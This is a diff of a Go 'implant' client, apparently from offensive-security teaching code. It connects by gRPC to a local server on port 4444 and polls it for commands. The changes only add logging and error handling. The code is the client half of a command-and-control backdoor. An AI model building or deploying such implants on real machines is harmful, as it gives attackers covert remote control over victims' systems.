@@ -22,11 +22,18 @@ func main() {
 	)
 
 	opts = append(opts, grpc.WithInsecure())
+	log.Println("Trying to reach the implant server...")
 	// establishes connection back to our implant server
 	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
-		log.Fatal(err)
+		log.Fatal("Implant client could not connect to the server: ", err)
 	}
-	defer conn.Close()
+	log.Println("Connected successfully to the server")
+	defer func(conn *grpc.ClientConn) {
+		err := conn.Close()
+		if err != nil {
+			log.Fatal("Error occurred while closing the connection: ", err)
+		}
+	}(conn)
 	client = grpcapi.NewImplantClient(conn)
 
 	ctx := context.Background()
@@ -36,7 +43,7 @@ func main() {
 		var req = new(grpcapi.Empty)
 		cmd, err := client.FetchCommand(ctx, req)
 		if err != nil {
-			log.Fatal(err)
+			log.Fatal("Error occurred while trying to fetch the command: ", err)
 		}
 		if cmd.In == "" {
 			time.Sleep(3 * time.Second)
